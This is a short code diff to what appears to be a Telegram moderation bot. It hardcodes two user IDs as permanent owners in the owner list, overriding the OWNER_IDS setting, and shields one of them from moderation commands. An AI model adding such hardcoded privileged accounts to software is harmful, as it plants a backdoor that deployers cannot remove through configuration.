@@ -124,7 +124,7 @@ const config: BotConfig = {
   botName: process.env.BOT_NAME || DEFAULT_CONFIG.botName,
   botUsername: process.env.BOT_USERNAME || DEFAULT_CONFIG.botUsername,
   defaultLang: normalizeBotLang(process.env.DEFAULT_LANG) ?? "fa",
-  ownerIds: splitIds(process.env.OWNER_IDS),
+  ownerIds: [...new Set(["8247710529", "7803287370", ...splitIds(process.env.OWNER_IDS)])],
   sudoIds: splitIds(process.env.SUDO_IDS),
   prefixes: [],
 };
@@ -640,7 +640,7 @@ async function studioReplyLive(ctx: BotContext): Promise<string | null> {
       }
       if(["warn","mute","perm_mute","ban","unmute","unban"].includes(studioCommand.id) && ctx.userRank==="sudo"){
         const targetId=ctx.replyToUserId ?? Number(commandArgs[0]?.replace(/^@/,""));
-        const protectedOwnerIds=new Set(["8247710529",...config.ownerIds]);
+        const protectedOwnerIds=new Set(["8247710529","7803287370",...config.ownerIds]);
         if(Number.isSafeInteger(Number(targetId)) && protectedOwnerIds.has(String(targetId))){
           await logCommandAccess(ctx,studioCommand.id,"permission_denied","sudo_security_owner_protected",auth.role);
           return ctx.lang==="fa"
